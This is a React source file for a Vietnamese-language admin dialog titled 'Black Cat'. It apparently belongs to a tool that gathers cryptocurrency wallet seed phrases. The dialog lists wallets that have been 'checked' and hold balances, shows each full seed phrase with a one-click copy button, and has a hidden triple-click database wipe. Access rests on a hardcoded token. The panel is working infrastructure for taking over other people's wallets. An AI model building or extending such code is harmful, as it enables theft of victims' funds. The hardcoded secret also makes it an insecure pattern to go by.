import React, { useState, useEffect } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Wallet, BlockchainType } from "@shared/schema";
import { getBlockchainIcon, getBlockchainColor } from "./icons/BlockchainIcons";
import { Copy } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

interface AdminDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [deleteCount, setDeleteCount] = useState<number>(0);
  const [lastDeleteClick, setLastDeleteClick] = useState<number>(0);
  const { toast } = useToast();

  useEffect(() => {
    if (open) {
      fetchWallets();
    }
  }, [open]);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      setError(null);

      const response = await fetch("/api/admin/query-wallets", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ token: "BlackCat" }),
      });

      if (!response.ok) {
        throw new Error(`API error: ${response.status}`);
      }

      const data = await response.json();
      setWallets(data.wallets || []);
    } catch (err) {
      console.error("Failed to fetch wallets:", err);
      setError("Không thể tải dữ liệu ví. Vui lòng thử lại sau.");
    } finally {
      setLoading(false);
    }
  };
  
  // Hàm copy seed phrase vào clipboard
  const copySeedPhrase = (seedPhrase: string) => {
    navigator.clipboard.writeText(seedPhrase)
      .then(() => {
        toast({
          title: "Đã sao chép!",
          description: "Seed phrase đã được sao chép vào clipboard"
        });
      })
      .catch(err => {
        console.error('Không thể sao chép vào clipboard:', err);
        toast({
          variant: "destructive",
          title: "Lỗi sao chép",
          description: "Không thể sao chép seed phrase. Vui lòng thử lại."
        });
      });
  };

  // Hàm xóa toàn bộ dữ liệu trong database
  const handleDeleteClick = async () => {
    const now = Date.now();
    
    // Kiểm tra xem click có cách nhau quá 3 giây không
    if (now - lastDeleteClick > 3000) {
      // Reset nếu quá 3 giây
      setDeleteCount(1);
    } else {
      // Tăng biến đếm nếu trong vòng 3 giây
      setDeleteCount(prev => prev + 1);
    }
    
    // Lưu thời gian click
    setLastDeleteClick(now);
    
    // Nếu đã đủ 3 lần liên tiếp, thực hiện xóa
    if (deleteCount === 2) { // 0, 1, 2 -> khi đạt 2 và click thêm lần nữa sẽ là lần thứ 3
      try {
        setLoading(true);
        
        const response = await fetch("/api/admin/clear-database", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ token: "BlackCat" }),
        });
        
        if (!response.ok) {
          throw new Error(`API error: ${response.status}`);
        }
        
        // Làm mới dữ liệu
        setWallets([]);
        toast({
          title: "Thành công!",
          description: "Đã xóa toàn bộ dữ liệu trong database"
        });
      } catch (err) {
        console.error("Lỗi khi xóa database:", err);
        toast({
          variant: "destructive",
          title: "Lỗi xóa dữ liệu",
          description: "Không thể xóa dữ liệu. Vui lòng thử lại sau."
        });
      } finally {
        setLoading(false);
        setDeleteCount(0);
      }
    } else {
      // Thông báo còn cần bao nhiêu lần click nữa
      toast({
        title: "Xác nhận xóa dữ liệu",
        description: `Nhấn thêm ${3 - deleteCount - 1} lần để xóa toàn bộ dữ liệu`
      });
    }
  };

  const renderBlockchainIcon = (blockchain: BlockchainType, balance: string) => {
    // Kiểm tra số dư bằng cách chuyển đổi sang số và so sánh
    // Sử dụng parseFloat để xử lý các số rất nhỏ và so sánh với 0
    if (parseFloat(balance) <= 0) {
      return null;
    }
    
    const IconComponent = getBlockchainIcon(blockchain);
    const colorClass = getBlockchainColor(blockchain);
    
    return (
      <div className="flex justify-center items-center">
        <IconComponent className={`${colorClass} w-6 h-6`} />
      </div>
    );
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[900px] max-h-[80vh] overflow-y-auto">
        <div className="relative mb-4">
          <button
            onClick={handleDeleteClick}
            className="absolute left-0 top-0 bg-red-50 hover:bg-red-100 text-red-600 h-10 w-10 rounded-full flex items-center justify-center"
            title={`Nhấn 3 lần liên tiếp để xóa toàn bộ dữ liệu (${deleteCount}/3)`}
          >
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M3 6h18"></path>
              <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"></path>
              <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"></path>
            </svg>
          </button>
          
          <DialogHeader className="text-center px-10">
            <DialogTitle>🐈‍⬛ Black Cat</DialogTitle>
            <DialogDescription>
              Xem tất cả ví đã được kiểm tra và có số dư
            </DialogDescription>
          </DialogHeader>
        </div>

        {loading && <div className="my-4 text-center">Đang tải dữ liệu...</div>}
        
        {error && (
          <div className="my-4 p-3 bg-red-100 text-red-800 rounded-md">
            {error}
          </div>
        )}

        {!loading && !error && wallets.length === 0 && (
          <div className="my-4 text-center">
            Không có dữ liệu ví nào trong database.
          </div>
        )}

        {wallets.length > 0 && (
          <div className="border border-black rounded-lg overflow-hidden">
            <table className="w-full">
              <colgroup>
                <col style={{width: "5%"}} />
                <col style={{width: "75%"}} />
                <col style={{width: "20%"}} />
              </colgroup>
              <thead className="bg-gray-100">
                <tr>
                  <th className="px-2 py-3 border-b border-r border-black font-medium text-center"></th>
                  <th className="px-4 py-3 border-b border-r border-black font-medium text-center">Seed Phrase</th>
                  <th className="px-4 py-3 border-b border-black font-medium text-center">Số dư</th>
                </tr>
              </thead>
              <tbody>
                {wallets.map((wallet, index) => (
                  <tr key={`${wallet.blockchain}-${wallet.address}-${index}`} 
                      className={index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
                    <td className="px-2 py-3 border-b border-r border-black text-center">
                      {renderBlockchainIcon(wallet.blockchain as BlockchainType, wallet.balance)}
                    </td>
                    <td className="px-3 py-3 border-b border-r border-black overflow-hidden">
                      <div className="font-mono text-sm break-words text-left flex items-center" title={wallet.seedPhrase}>
                        <span className="mr-2">{wallet.seedPhrase}</span>
                        <button 
                          onClick={() => copySeedPhrase(wallet.seedPhrase)}
                          className="text-gray-500 hover:text-black transition-colors p-1 rounded-full hover:bg-gray-100"
                          title="Sao chép seed phrase"
                        >
                          <Copy className="h-3.5 w-3.5" />
                        </button>
                      </div>
                    </td>
                    <td className="px-2 py-3 border-b border-black text-left font-mono whitespace-normal break-all max-w-[20%] overflow-hidden">
                      {wallet.balance === "0" ? "0.00000000" : wallet.balance}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}